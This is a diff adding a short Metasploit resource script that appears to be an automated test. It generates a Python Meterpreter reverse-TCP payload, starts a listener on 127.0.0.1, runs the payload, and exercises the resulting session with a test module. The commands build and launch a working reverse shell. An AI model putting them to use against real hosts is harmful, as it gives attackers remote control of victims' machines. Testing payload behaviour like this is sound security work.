@@ -1,0 +1,23 @@
+## Load test modules
+loadpath test/modules
+
+## Payload
+use python/meterpreter_reverse_tcp
+
+## Set global datastore
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231122-3208-u2c18ptxt
+
+## Generate command
+generate -o /tmp/child-process-rb-python-meterpreter-reverse-tcp20231122-3208-d3i8oa.py -f raw AutoVerifySessionTimeout=30 lport=6003 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/pythonmeterpreter_reverse_tcp_debug_log20231122-3208-31yhuntxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+
+## Create listener
+to_handler
+
+## Execute command
+python /tmp/child-process-rb-python-meterpreter-reverse-tcp20231122-3208-d3i8oa.py
+
+
+## Replication commands
+use test/meterpreter
+run session=4 AddEntropy=true Verbose=true
